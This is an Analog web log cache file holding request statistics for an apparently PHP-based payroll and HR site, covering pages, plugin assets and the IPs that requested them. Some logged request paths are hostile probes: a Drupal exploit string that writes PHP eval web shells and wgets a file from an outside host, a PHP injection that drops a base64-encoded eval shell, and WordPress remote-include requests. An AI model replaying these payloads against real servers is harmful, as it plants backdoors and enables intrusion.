CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!
T	0	0	4819	83	360	79	78186629
D	24966191	25972163
17337	182	1	0	0
17409	123	66	1	532794
17411	106	66	1	534643
17411	107	6	0	32294
17427	218	1	0	6762
17433	179	69	1	877624
17459	89	64	1	667799
17470	107	1	0	0
17470	129	24	0	193132
17471	183	31	0	270846
17471	185	48	1	774823
17472	123	7	1	289473
17473	91	67	1	794653
17494	200	74	1	965844
17495	99	83	1	1214474
17495	167	5	2	248992
17495	168	11	0	371697
17495	169	2	0	18917
17496	164	67	1	792552
17496	168	1	0	18219
17500	176	31	0	270846
17500	184	31	0	270846
17500	185	43	1	756238
17500	186	41	2	697178
17500	187	1	0	37087
17500	190	2	0	37087
17500	193	3	0	124451
17501	139	3	0	13212
17544	135	31	0	270846
17544	138	31	1	441444
17544	139	2	0	2254
17544	169	5	1	111695
17544	176	51	1	592077
17550	201	30	0	270846
17587	129	66	1	829850
17595	217	67	1	790680
17628	118	65	1	784119
17632	214	69	1	832891
17634	118	72	1	969850
17639	193	67	1	821684
17639	206	3	0	66245
17639	207	1	0	19122
17639	208	5	2	294279
17647	153	93	2	1396850
17647	165	3	0	125750
17647	179	45	1	636474
17647	180	16	0	193439
17647	181	95	2	1219820
17647	187	6	0	604649
17647	188	2	0	59769
17647	189	5	1	766247
17647	190	6	0	189628
17647	191	7	0	165716
17647	192	6	1	249391
17647	193	4	2	278465
17647	194	8	1	521960
17647	195	2	0	105095
17647	196	1	0	62469
17647	197	1	0	63825
17647	199	1	0	65206
17647	201	1	0	65210
17647	202	4	0	240608
17647	203	2	0	137763
17647	204	1	0	0
17647	205	5	0	178259
17647	206	74	1	2046520
17647	207	6	0	218586
17647	208	7	0	267322
17647	209	2	0	23652
17647	210	5	0	137142
17647	211	1	0	0
17647	212	10	0	1262978
17647	213	14	0	725422
17647	214	7	0	336189
17648	102	2	1	153601
17648	103	5	1	190251
17648	117	26	2	815293
17648	118	13	1	819244
17648	120	116	0	750655
17648	121	5	0	247839
17650	149	25	1	476761
17682	180	31	0	270846
17682	181	49	1	942273
17682	182	1	0	29659
17682	183	13	0	162680
17682	203	26	0	297888
17683	193	10	0	89962
17685	162	11	0	89962
17685	163	26	1	455647
17689	192	63	1	657137
17695	212	72	1	800348
17696	113	1	0	6762
17696	114	7	0	26420
17696	115	26	1	551711
17696	120	15	1	344201
17712	176	67	1	801913
17712	191	4	0	59504
17715	184	74	1	813399
17715	185	17	1	262995
17715	186	15	1	353235
17725	207	81	1	1217889
17725	214	5	0	90238
17726	113	22	0	258787
17733	244	1	0	6762
17738	123	81	1	911196
17738	124	15	1	559630
17738	125	5	0	113116
17739	139	29	1	503598
17751	214	68	1	682395
17757	189	31	0	270846
17773	164	74	1	1010142
17789	183	117	2	1277713
17799	101	30	0	270846
17799	102	39	1	631889
17806	126	83	1	984133
17817	94	71	1	944403
17829	176	76	1	941047
17834	126	32	1	590741
17857	134	33	0	277756
17857	135	3	0	20582
17857	136	31	1	362464
17857	137	2	1	109218
17857	141	14	0	586986
17857	142	9	0	573665
17857	145	5	0	305845
17857	147	3	0	191227
17857	148	6	0	245836
17857	149	24	0	1152421
17857	150	22	0	1490314
17857	151	6	0	151158
17858	151	61	1	631843
17858	152	45	0	1332409
17858	153	28	0	905423
17858	154	33	0	970675
17858	178	2	0	12205
17863	169	77	1	1452140
17863	223	73	1	787055
17865	147	23	1	555848
17866	117	10	1	457952
17886	190	31	0	270846
17886	191	55	2	764985
17886	194	33	2	411960
17886	195	18	0	455843
17886	196	39	0	446210
17886	197	33	0	597806
17886	198	56	0	1219546
17886	199	62	0	1046954
17886	200	66	0	1631057
17886	201	33	0	865257
17886	202	29	0	679004
17886	203	28	0	605112
17887	125	3	0	14366
17901	122	1	0	0
17918	98	75	1	902915
17918	99	2	0	40428
17918	124	4	1	36709
17918	125	5	0	71436
17926	91	67	1	777608
17929	64	1	0	4526
17932	97	39	0	526536
17932	98	3	0	20146
17942	69	66	1	766883
17942	70	6	0	58308
17988	141	66	1	762835
17988	176	6	1	74211
17988	177	4	0	33615
17993	195	1	0	26552
18004	102	1	0	24
18010	141	37	0	506961
18012	281	1	0	24
18018	132	2	0	4570
18021	140	1	0	24
18036	64	1	0	24
1	2	0	0	0	25714837	0	0	25510526	0	0	59665	/loans/2018
1	0	0	4	0	0	25723566	0	0	25714832	0	0	/delete-payroll?date=2018-11-30
1	49	0	0	0	25903428	0	0	25069576	0	0	62604	/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.css
1	8	0	0	0	25412750	0	0	25391151	0	0	408068	/payroll/0?sub=3-2018
1	63	0	0	0	25903428	0	0	25069576	0	0	167140	/plugins/bootstrap-datepicker/css/bootstrap-datepicker3.min.css
1	53	0	0	0	25903428	0	0	25069576	0	0	69717	/plugins/bootstrap-daterangepicker/daterangepicker-bs3.css
1	55	0	0	0	25935109	0	0	25069575	0	0	116160	/admin/layout4/scripts/demo.js
1	1	0	0	0	25104418	0	0	25104418	0	0	18904	/payroll-pdf/285
1	1	0	0	0	25756835	0	0	25756835	0	0	26933	/units-made
1	5	0	0	0	25543342	0	0	25506160	0	0	202320	/payroll/0?sub=6-2018
1	53	0	7	40	25903606	25714834	25903606	25412588	25714830	25412447	2691458	/payroll-print
1	1	0	0	0	25802414	0	0	25802414	0	0	32337	/payroll-pdf/280
1	1	0	0	0	25756814	0	0	25756814	0	0	5264	/departments/1?type=branch
1	8	0	0	0	25756830	0	0	25412631	0	0	274240	/deductions
1	4	0	0	0	25656953	0	0	25641274	0	0	164496	/payroll/0?sub=9-2018
1	4	0	0	0	25193641	0	0	25192364	0	0	136936	/payroll/0?sub=9-2017
1	5	0	6	0	25938689	25961527	0	25656952	25918832	0	120	/robots.txt?104.236.245.192
1	2	0	0	0	25510531	0	0	25510524	0	0	59478	/loans/06-2018
1	36	0	0	0	25836830	0	0	25104417	0	0	2398578	/contracts
1	1	0	0	0	25069576	0	0	25069576	0	0	3832	/loans/06-2017
1	0	0	2	0	0	25193298	0	0	25193297	0	0	/policies/7
1	0	0	2	0	0	25756839	0	0	25756835	0	0	/policies/6
1	53	0	0	0	25935109	0	0	25069575	0	0	425646	/scripts/metronic.js
1	2	0	0	0	25401204	0	0	25384911	0	0	1898	/plugins/select2/select2x2.png
1	1	0	0	0	25756838	0	0	25756838	0	0	37356	/contracts/16/edit
1	0	0	1	0	0	25910896	0	0	25910896	0	0	/user/register/?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
1	1	0	0	0	25756823	0	0	25756823	0	0	35211	/payment-methods/create
1	4	0	0	0	25935109	0	0	25069575	0	0	772	/img/remove-icon-small.png
1	0	0	0	1	0	0	25822569	0	0	25822569	0	/password
1	9	0	0	0	25935109	0	0	25412616	0	0	1246887	/_debugbar/assets/stylesheets?v=1473948356
1	0	0	12	0	0	25215582	0	0	24914079	0	0	/?138.197.37.233
1	3	0	0	0	25756843	0	0	25716282	0	0	111959	/contracts/30/edit
1	0	0	0	2	0	0	25910896	0	0	25910896	0	/webconfig.txt.php
1	48	0	0	0	25903428	0	0	25069576	0	0	1206258	/plugins/datatables/media/js/jquery.dataTables.min.js
1	17	0	0	0	25756844	0	0	25104418	0	0	540527	/payroll/create
1	1	0	0	0	25756850	0	0	25756850	0	0	28519	/tax?type=p10b
1	1	0	0	0	25756850	0	0	25756850	0	0	28517	/tax?type=p10a
1	78	0	14	1	25802546	25756844	25776900	25104418	25264206	25776900	9868029	/payroll
1	15	0	1	0	25756854	25822570	0	25714825	25822570	0	635771	/payroll/0?sub=11-2018
1	55	0	0	0	25903428	0	0	25069576	0	0	3262820	/plugins/simple-line-icons/fonts/Simple-Line-Icons.woff
1	89	0	88	0	25946582	25935109	0	25069575	25069576	0	619629	/login
1	2	0	0	0	25200969	0	0	25200926	0	0	73086	/payroll/0?sub=11-2017
1	4	0	0	0	25756840	0	0	25756823	0	0	118405	/payment-structures
1	50	0	0	0	25903428	0	0	25069576	0	0	32976	/plugins/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js
1	1	0	0	0	25506235	0	0	25506235	0	0	28019	/payroll/722?104.236.245.192
1	2	0	0	0	25756826	0	0	25714807	0	0	81721	/contracts/create
1	51	0	0	0	25903428	0	0	25069576	0	0	163856	/plugins/bootstrap-switch/js/bootstrap-switch.min.js
1	0	0	1	0	0	25756814	0	0	25756814	0	0	/departments?type=department
1	2	0	0	0	25756843	0	0	25716283	0	0	74557	/contracts/39/edit
1	59	0	0	0	25935109	0	0	25069575	0	0	327450	/img/syncfusion-icons-white.png
1	2	0	0	0	25756842	0	0	25716284	0	0	74545	/contracts/43/edit
1	0	0	1	0	0	25462986	0	0	25462986	0	0	/users/9
1	1	0	0	0	25756855	0	0	25756855	0	0	18419	/payroll-pdf/834
1	12	0	0	0	25903603	0	0	25412447	0	0	381780	/plugins/uniform/images/sprite.png
1	68	0	0	0	25903428	0	0	25069576	0	0	497508	/plugins/jquery-ui/jquery-ui.min.css
1	1	0	0	0	25802415	0	0	25802415	0	0	32324	/payroll-pdf/203
1	0	0	1	0	0	25072376	0	0	25072376	0	0	/employee-deductions/8
1	0	0	1	0	0	25462986	0	0	25462986	0	0	/users/2
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://customcoverinc.com/images/banners/shopreadme.txt&wpaa=phpinfo();exit();
1	1	0	0	0	25714821	0	0	25714821	0	0	34260	/worked/10-2018
1	1	0	0	0	25200926	0	0	25200926	0	0	28009	/payroll/539
1	17	0	3	0	25836830	25756829	0	25072374	25714818	0	732165	/employees
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=echo+'Vuln!!+patch+it+Now!'+>+vuln.htm%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+sites/default/files/vuln.php%3B+echo+'Vuln!!<%3Fphp+@eval($_POST['pass'])+%3F>'>+vuln.php%3B+cd+sites/default/files/%3B+echo+'AddType+application/x-httpd-php+.jpg'+>+.htaccess%3B+wget+'http://40k.waszmann.de/Deutsch/images/up.php'
1	0	0	1	0	0	25723566	0	0	25723566	0	0	/advances/28
1	2	0	0	0	25756814	0	0	25756814	0	0	6777	/departments/create?type=department
1	0	0	0	1	0	0	25412730	0	0	25412730	0	/home/cloudwage/public_html/images/smalllogo.jpg
1	51	0	0	0	25903428	0	0	25069576	0	0	99764	/plugins/jquery-slimscroll/jquery.slimscroll.min.js
1	1	0	0	0	25714834	0	0	25714834	0	0	19146	/payroll-pdf/800
1	1	0	0	0	25714828	0	0	25714828	0	0	18433	/payroll-pdf/790
1	1	0	0	0	25756831	0	0	25756831	0	0	37167	/contracts/3/edit
1	1	0	0	0	25195064	0	0	25195064	0	0	28008	/payroll/508
1	1	0	0	0	25157335	0	0	25157335	0	0	0	/favicon.ico?138.197.37.233
1	4	0	1	0	25159167	25160297	0	25159166	25160297	0	112080	/payroll/507
1	6	0	0	0	25193641	0	0	25161577	0	0	168042	/payroll/504
1	1	0	0	0	25681591	0	0	25681591	0	0	19098	/payroll-pdf/774
1	26	0	3	0	25756855	25756798	0	25193299	25412585	0	792615	/users
1	2	0	0	0	25681591	0	0	25674642	0	0	36846	/payroll-pdf/772
1	2	0	0	0	25193641	0	0	25192364	0	0	56012	/payroll/491
1	0	0	2	0	0	25413711	0	0	25413711	0	0	/employee-deductions/124
1	1	0	0	0	25656952	0	0	25656952	0	0	18439	/payroll-pdf/767
1	2	0	0	0	25756839	0	0	25756835	0	0	68297	/policies/6/edit
1	1	0	0	0	25656954	0	0	25656954	0	0	18504	/payroll-pdf/762
1	1	0	0	0	25756822	0	0	25756822	0	0	29631	/payment-methods
1	63	0	0	0	25935109	0	0	25069575	0	0	3577140	/plugins/font-awesome/fonts/fontawesome-webfont.woff2?v=4.3.0
1	1	0	0	0	25641274	0	0	25641274	0	0	18423	/payroll-pdf/761
1	1	0	0	0	25617079	0	0	25617079	0	0	19966	/payroll-pdf/759
1	50	0	0	0	25903428	0	0	25069576	0	0	624960	/plugins/jquery.sparkline.min.js
1	1	0	0	0	25756815	0	0	25756815	0	0	52072	/allowances/create
1	28	0	0	8	25903605	0	25776588	25412447	0	25714830	1374710	/payroll-generate
1	2	0	0	0	25631071	0	0	25593942	0	0	36870	/payroll-pdf/756
1	56	0	0	0	25935109	0	0	25069575	0	0	381080	/plugins/jquery-validation/js/jquery.validate.min.js
1	1	0	0	0	25631071	0	0	25631071	0	0	18423	/payroll-pdf/749
1	0	0	0	1	0	0	25822569	0	0	25822569	0	/password/reset
1	243	0	0	0	25935109	0	0	25069575	0	0	1311763	/plugins/font-awesome/css/font-awesome.min.css
1	1	0	0	0	25727629	0	0	25727629	0	0	18433	/payroll-pdf/745
1	1	0	0	0	25462986	0	0	25462986	0	0	63276	/users/11/edit
1	3	0	1	0	25972163	25926295	0	25946582	25926295	0	72	/robots.txt
1	3	0	0	0	25200934	0	0	25200926	0	0	101656	/loans/details/6
1	1	0	0	0	25544859	0	0	25544859	0	0	18504	/payroll-pdf/743
1	0	0	1	0	0	25903602	0	0	25903602	0	0	/payroll-report?104.236.245.192
1	1	0	0	0	25543342	0	0	25543342	0	0	18443	/payroll-pdf/740
1	9	0	0	0	25935109	0	0	25412616	0	0	1720890	/_debugbar/assets/javascript?v=1473948119
1	58	0	0	0	25935109	0	0	25069575	0	0	180432	/plugins/select2/select2.css
1	4	0	0	0	25756816	0	0	25412630	0	0	246954	/allowances
1	3	0	0	0	25193644	0	0	25192364	0	0	84018	/payroll/452
1	64	0	0	0	25935109	0	0	25069575	0	0	136586	/plugins/uniform/css/uniform.default.css
1	1	0	0	0	25716282	0	0	25716282	0	0	33666	/employees/28/edit
1	1	0	0	0	25506235	0	0	25506235	0	0	18504	/payroll-pdf/722
1	1	0	0	0	25525039	0	0	25525039	0	0	18423	/payroll-pdf/721
1	3	0	0	0	25412749	0	0	25325926	0	0	134740	/payroll/0?sub=2-2018
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.tekmat.net/wp-content/uploads/2014/04/jpg.txt&wpaa=phpinfo();
1	1	0	0	0	25463099	0	0	25463099	0	0	19139	/payroll-pdf/718
1	2	0	0	0	25525072	0	0	25467217	0	0	38246	/payroll-pdf/717
1	48	0	0	0	25903428	0	0	25069576	0	0	141128	/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.js
1	5	0	0	0	25543338	0	0	25462986	0	0	195760	/payroll/0?sub=5-2018
1	1	0	0	0	25401128	0	0	25401128	0	0	35672	/payroll/0?sub=5-2017
1	20	0	0	0	25836829	0	0	25391151	0	0	133243	/login?104.236.245.192
1	5	0	0	0	25727629	0	0	25593942	0	0	196583	/payroll/0?sub=8-2018
1	2	0	0	0	25193641	0	0	25192364	0	0	70988	/payroll/0?sub=8-2017
1	1	0	0	0	25412750	0	0	25412750	0	0	32261	/payroll-pdf/697
1	8	0	0	0	25756849	0	0	25481862	0	0	4688	/plugins/select2/select2.png
1	30	0	0	0	25903428	0	0	25069576	0	0	28950	/admin/layout4/img/sidebar-toggle-light.png
1	1	0	0	0	25412446	0	0	25412446	0	0	18420	/payroll-pdf/696
1	1	0	0	0	25413725	0	0	25413725	0	0	17067	/payroll-pdf/706
1	1	0	0	0	25412446	0	0	25412446	0	0	18428	/payroll-pdf/695
1	1	0	0	0	25413710	0	0	25413710	0	0	18435	/payroll-pdf/704
1	1	0	0	0	25416748	0	0	25416748	0	0	18441	/payroll-pdf/702
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
1	1	0	0	0	25393553	0	0	25393553	0	0	18438	/payroll-pdf/682
1	1	0	0	0	25836830	0	0	25836830	0	0	9327	/employees/43
1	1	1	62	2	25412585	25914328	25776588	25412585	24914965	25630064	101762	/?104.236.245.192
1	2	0	0	0	25412749	0	0	25393554	0	0	52039	/payroll-pdf/679
1	1	0	0	0	25593943	0	0	25593943	0	0	39178	/employees/40
1	2	0	0	0	25412750	0	0	25391151	0	0	50720	/payroll-pdf/677
1	3	0	0	0	25813896	0	0	25510524	0	0	95786	/employees/37
1	1	0	0	0	25756855	0	0	25756855	0	0	28009	/payroll/395
1	56	0	0	0	25935109	0	0	25069575	0	0	9882	/admin/layout4/css/custom.css
1	1	0	0	0	25393553	0	0	25393553	0	0	18432	/payroll-pdf/674
1	2	0	0	0	25462986	0	0	25412579	0	0	126821	/users/2/edit
1	1	0	0	0	25510526	0	0	25510526	0	0	37681	/loans/7/edit
1	2	0	0	0	25412743	0	0	25412742	0	0	720616	/_debugbar/assets/javascript?v=1500638208
1	1	0	0	0	25726335	0	0	25726335	0	0	54123	/employees/30
1	4	0	0	0	25836830	0	0	25200925	0	0	109191	/employees/29
1	1	0	0	0	25836831	0	0	25836831	0	0	10088	/employees/28
1	1	0	0	0	25072376	0	0	25072376	0	0	3698	/employee-deductions/8/edit
1	5	0	0	0	25756837	0	0	25756835	0	0	136477	/hours-worked
1	0	0	2	0	0	24780781	0	0	24756164	0	0	/?138.197.94.13
1	2	0	0	0	25104418	0	0	25072375	0	0	54959	/employees/23
1	4	0	0	0	25756842	0	0	25525038	0	0	149076	/contracts/25/edit
1	0	0	1	0	0	25462995	0	0	25462995	0	0	/users/11
1	0	0	1	0	0	25756798	0	0	25756798	0	0	/users/10
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/administrator/webconfig.txt.php
1	55	0	0	0	25935109	0	0	25069575	0	0	31111	/css/style.css
1	2	0	0	0	25413711	0	0	25072375	0	0	64109	/employees/14
1	56	0	0	0	25903428	0	0	25069576	0	0	13608	/plugins/morris/morris.css
1	2	0	0	0	25756817	0	0	25756817	0	0	139142	/deductions/4
1	0	0	1	0	0	25910896	0	0	25910896	0	0	/?1=@ini_set("display_errors","0")%3B@set_time_limit(0)%3B@set_magic_quotes_runtime(0)%3Becho '->|'%3Bfile_put_contents($_SERVER['DOCUMENT_ROOT'].'/webconfig.txt.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+'))%3Becho '|<-'%3B
1	1	0	0	0	25072375	0	0	25072375	0	0	5858	/deductions/3
1	4	0	0	0	25756830	0	0	25072375	0	0	460955	/deductions/2
1	8	0	0	0	25525038	0	0	25413711	0	0	1202561	/deductions/1
1	1	0	0	0	25756814	0	0	25756814	0	0	2534	/departments/create
1	4	0	0	0	25714787	0	0	25674642	0	0	161438	/payroll/0?sub=10-2018
1	9	0	0	0	25195064	0	0	25159166	0	0	318961	/payroll/0?sub=10-2017
1	1	0	0	0	25193296	0	0	25193296	0	0	32976	/payroll/0?sub=10-2016
1	56	0	0	0	25935109	0	0	25069575	0	0	423752	/plugins/excanvas.min.js
1	53	0	0	0	25935109	0	0	25069575	0	0	178398	/admin/layout4/scripts/layout.js
1	9	0	1	0	25756836	25714825	0	25714792	25714825	0	304159	/worked
1	78	0	0	0	25903428	0	0	25069576	0	0	30020	/plugins/bootstrap-modal/css/bootstrap-modal-bs3patch.css
1	1	0	0	0	25716284	0	0	25716284	0	0	37380	/contracts/42/edit
1	2	0	0	0	25401194	0	0	25401128	0	0	56007	/payroll/349
1	3	0	0	0	25756854	0	0	25714831	0	0	162028	/payroll-pdfs?all=true&sub=11-2018
1	1	0	0	0	25756843	0	0	25756843	0	0	37168	/contracts/45/edit
1	57	0	0	0	25935109	0	0	25069575	0	0	1830400	/plugins/jquery.min.js
1	58	0	0	0	25935109	0	0	25069575	0	0	2378264	/css/components-rounded.css
1	57	0	0	0	25935109	0	0	25069575	0	0	51300	/admin/pages/css/login3.css
1	53	0	0	0	25836829	0	0	25069576	0	0	60208	/plugins/datatables/media/images/sort_both.png
1	54	0	0	0	25903428	0	0	25069576	0	0	150904	/css/fullcalendar.min.css
1	2	0	0	0	25802546	0	0	25802412	0	0	16243	/payroll/963
1	1	0	0	0	25802545	0	0	25802545	0	0	8106	/payroll/961
1	1	0	0	0	25756825	0	0	25756825	0	0	68548	/grades/create
1	146	0	0	0	25935109	0	0	25069575	0	0	311184	/plugins/simple-line-icons/simple-line-icons.min.css
1	1	0	0	0	25756837	0	0	25756837	0	0	27830	/payment-structures/2
1	1	0	0	0	25802412	0	0	25802412	0	0	8132	/advances/01-2019
1	50	0	0	0	25903428	0	0	25069576	0	0	69216	/plugins/bootstrap-toastr/toastr.min.js
1	0	0	0	1	0	0	25756833	0	0	25756833	0	/assignments/44
1	54	0	0	0	25935109	0	0	25069575	0	0	40248	/plugins/jquery.cokie.min.js
1	2	0	0	0	25723566	0	0	25714829	0	0	65673	/advances/11-2018
1	55	0	0	0	25903428	0	0	25069576	0	0	31747	/admin/pages/css/tasks.css
1	54	0	0	0	25935109	0	0	25069575	0	0	951652	/plugins/select2/select2.min.js
1	73	0	0	0	25903428	0	0	25069576	0	0	16969	/admin/pages/scripts/tasks.js
1	48	0	0	0	25903428	0	0	25069576	0	0	1421584	/js/fullcalendar.min.js
1	54	0	0	0	25935109	0	0	25069575	0	0	77112	/admin/pages/scripts/login.js
1	0	0	1	0	0	25756844	0	0	25756844	0	0	/delete-payroll?date=2018-12-31
1	2	0	0	0	25756849	0	0	25714832	0	0	63199	/coinage/create
1	1	0	0	0	25104418	0	0	25104418	0	0	27992	/payroll/285
1	15	0	0	0	25756839	0	0	25193297	0	0	559771	/policies
1	0	0	0	1	0	0	25910896	0	0	25910896	0	/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://www.acne-school.ru//sites/all/modules/webform/tests/subform.txt&wpaa=phpinfo();exit();
1	1	0	0	0	25802414	0	0	25802414	0	0	8107	/payroll/280
1	2	0	0	0	25412743	0	0	25412742	0	0	390724	/_debugbar/assets/stylesheets?v=1500638208
1	2	0	0	0	25413711	0	0	25413711	0	0	57303	/employee-deductions/124/edit
1	2	0	0	0	25756821	0	0	25200931	0	0	67816	/policies/5/edit
1	2	0	0	0	25756825	0	0	25756824	0	0	57358	/grades
1	2	0	0	0	25756854	0	0	25714831	0	0	54281	/payroll/0?all=true&sub=11-2018
1	10	0	0	0	25756859	0	0	25384911	0	0	328250	/tax?type=p9
1	0	0	4	0	0	24741978	0	0	24692752	0	0	/?138.197.46.35
1	1	0	0	0	25200926	0	0	25200926	0	0	19049	/payroll-pdf/539
1	1	0	0	0	25756834	0	0	25756834	0	0	38467	/loans/create
1	50	0	0	0	25903428	0	0	25069576	0	0	420864	/plugins/bootstrap-datepicker/js/bootstrap-datepicker.min.js
1	0	0	8	0	0	24888961	0	0	24781925	0	0	/?138.197.5.174
1	5	0	0	0	25756815	0	0	25756813	0	0	45513	/departments
1	0	0	1	0	0	25714787	0	0	25714787	0	0	/finalize-payroll?date=2018-10-31
1	55	0	0	0	25903428	0	0	25069576	0	0	140715	/plugins/bootstrap-toastr/toastr.min.css
1	54	0	0	0	25935109	0	0	25069575	0	0	183300	/plugins/jquery.blockui.min.js
1	2	0	0	0	25756827	0	0	25756825	0	0	59504	/employee-types
1	1	0	0	0	25802546	0	0	25802546	0	0	9499	/payroll/0?sub=1-2019
1	2	0	0	0	25195080	0	0	25195064	0	0	36438	/payroll-pdf/508
1	4	0	0	0	25756827	0	0	25714809	0	0	277804	/employees/create
1	6	0	0	0	25159167	0	0	25159166	0	0	109482	/payroll-pdf/507
1	8	0	0	0	25416748	0	0	25412446	0	0	369406	/payroll/0?sub=4-2018
1	6	0	0	0	25193641	0	0	25161577	0	0	116310	/payroll-pdf/504
1	2	0	0	0	25193642	0	0	25192364	0	0	38541	/payroll-pdf/491
1	3	0	0	0	25727629	0	0	25544859	0	0	113072	/payroll/0?sub=7-2018
1	1	0	0	0	24966191	0	0	24966191	0	0	0	/robots.txt?45.55.208.145
1	55	0	0	0	25935109	0	0	25069575	0	0	162339	/plugins/jquery-migrate.min.js
1	1	0	0	0	25723566	0	0	25723566	0	0	28038	/advances/28/edit
1	1	0	0	0	25756813	0	0	25756813	0	0	33759	/profile
1	5	0	2	0	25756849	25756851	0	25384911	25482841	0	309570	/tax/p9
1	1	0	0	0	25525038	0	0	25525038	0	0	28444	/employee-deductions/70/edit
1	1	0	0	0	25756855	0	0	25756855	0	0	28006	/payroll/834
1	0	0	1	0	0	25756843	0	0	25756843	0	0	/contracts/45
1	1	0	0	0	25802415	0	0	25802415	0	0	8104	/payroll/203
1	48	0	0	0	25903428	0	0	25069576	0	0	72404	/js/scripts.js
1	0	0	2	0	0	25756842	0	0	25716284	0	0	/contracts/43
1	48	0	0	0	25903428	0	0	25069576	0	0	511934	/plugins/moment.min.js
1	0	0	1	0	0	25716284	0	0	25716284	0	0	/contracts/42
1	0	0	1	0	0	25756841	0	0	25756841	0	0	/contracts/41
1	3	0	0	0	25200934	0	0	25200925	0	0	89257	/loans/11-2017
1	2	0	0	0	25526006	0	0	25482817	0	0	143016	/plugins/font-awesome/fonts/fontawesome-webfont.woff?v=4.3.0
1	0	0	2	0	0	25756843	0	0	25716284	0	0	/contracts/39
1	94	0	0	0	25903428	0	0	25069576	0	0	109112	/plugins/bootstrap-modal/css/bootstrap-modal.css
1	54	0	0	0	25935109	0	0	25069575	0	0	506740	/plugins/bootstrap/js/bootstrap.min.js
1	1	0	2	0	25337887	25756841	0	25337887	25716283	0	29602	/contracts/31
1	1	0	2	0	25337886	25756844	0	25337886	25716283	0	29609	/contracts/30
1	0	0	2	0	0	25756842	0	0	25716282	0	0	/contracts/25
1	1	0	0	0	25412582	0	0	25412582	0	0	63455	/users/7/edit
1	2	0	0	0	25193645	0	0	25192364	0	0	37834	/payroll-pdf/452
1	54	0	0	0	25935109	0	0	25069575	0	0	157820	/plugins/uniform/jquery.uniform.min.js
1	53	0	0	0	25836829	0	0	25069576	0	0	59254	/plugins/datatables/media/images/sort_asc.png
1	56	0	0	0	25935109	0	0	25069575	0	0	466398	/css/plugins.css
1	0	0	2	0	0	25756837	0	0	25756835	0	0	/hours-worked/create
1	1	0	0	0	25714828	0	0	25714828	0	0	28216	/payroll/790
1	1	0	0	0	25714834	0	0	25714834	0	0	28216	/payroll/800
1	2	0	0	0	25756841	0	0	25716283	0	0	74545	/contracts/31/edit
1	1	0	0	0	25756832	0	0	25756832	0	0	28465	/assignments/44/edit
1	96	0	0	0	25935109	0	0	25069575	0	0	1869002	/plugins/bootstrap/css/bootstrap.min.css
1	6	0	0	0	25756857	0	0	25756840	0	0	241080	/payroll/0?sub=12-2018
1	55	0	0	0	25935109	0	0	25069575	0	0	113190	/plugins/respond.min.js
1	1	0	0	0	25543345	0	0	25543345	0	0	37173	/contracts/37/edit
1	190	0	0	2	25935109	0	25630162	25069575	0	25630064	0	/favicon.ico
1	18	0	4	0	25802412	25716293	0	25412747	25714789	0	648776	/advances
1	1	0	0	0	25681591	0	0	25681591	0	0	28192	/payroll/774
1	51	0	0	0	25903428	0	0	25069576	0	0	3119879	/plugins/jquery-ui/jquery-ui.min.js
1	58	0	0	0	25935109	0	0	25069575	0	0	137256	/admin/layout4/css/themes/default.css
1	2	0	0	0	25681591	0	0	25674642	0	0	56378	/payroll/772
1	1	0	0	0	25756841	0	0	25756841	0	0	37168	/contracts/41/edit
1	1	0	0	0	25756822	0	0	25756822	0	0	30332	/shifts
1	1	0	0	0	25756850	0	0	25756850	0	0	23649	/tax/p10a
1	1	0	0	0	25656952	0	0	25656952	0	0	28198	/payroll/767
1	23	0	0	0	25903605	0	0	25412446	0	0	770056	/payroll-report
1	0	0	9	0	0	25903608	0	0	25412582	0	0	/logout
1	1	0	0	0	25656954	0	0	25656954	0	0	28206	/payroll/762
1	7	0	0	0	25756833	0	0	25714787	0	0	217758	/advances/create
1	1	0	0	0	25641274	0	0	25641274	0	0	28188	/payroll/761
1	0	0	1	0	0	25954470	0	0	25954470	0	0	/?54.36.148.169
1	1	0	0	0	25617078	0	0	25617078	0	0	28197	/payroll/759
1	2	0	0	0	25631071	0	0	25593942	0	0	56394	/payroll/756
1	1	0	0	0	25193296	0	0	25193296	0	0	28006	/payroll/35
1	1	0	0	0	25756855	0	0	25756855	0	0	18497	/payroll-pdf/395
1	1	0	0	0	25631071	0	0	25631071	0	0	28190	/payroll/749
1	2	0	0	0	25714834	0	0	25714829	0	0	72074	/worked/11-2018
1	1	0	0	0	25727629	0	0	25727629	0	0	28194	/payroll/745
1	1	0	0	0	25756817	0	0	25756817	0	0	55769	/employee-deductions/create?deduction=4
1	1	0	0	0	25544859	0	0	25544859	0	0	28019	/payroll/743
1	2	0	0	0	25756830	0	0	25756830	0	0	63080	/employee-deductions/create?deduction=2
1	4	0	0	0	25756836	0	0	25714792	0	0	222518	/worked/create
1	1	0	0	0	25412748	0	0	25412748	0	0	44554	/advances/03-2018
1	1	0	0	0	25543342	0	0	25543342	0	0	28015	/payroll/740
1	1	0	0	0	25412616	0	0	25412616	0	0	951	/_debugbar/open?max=20&offset=0
1	59	0	0	0	25903428	0	0	25069576	0	0	89916	/images/smalllogo.jpg
1	1	0	0	0	25756832	0	0	25756832	0	0	45446	/assignments
1	1	0	0	0	25193296	0	0	25193296	0	0	21122	/payroll-pdf/35
1	1	0	0	0	25525039	0	0	25525039	0	0	28003	/payroll/721
1	1	0	0	0	25463099	0	0	25463099	0	0	28012	/payroll/718
1	2	0	1	0	25525072	25526006	0	25467217	25526006	0	56006	/payroll/717
1	82	82	84	14	25903602	25972163	25781553	25069576	24691619	25630162	7742041	/
1	50	0	0	0	25903428	0	0	25069576	0	0	70368	/admin/layout4/scripts/quick-sidebar.js
1	55	0	0	0	25935109	0	0	25069575	0	0	459351	/admin/layout4/css/layout.css
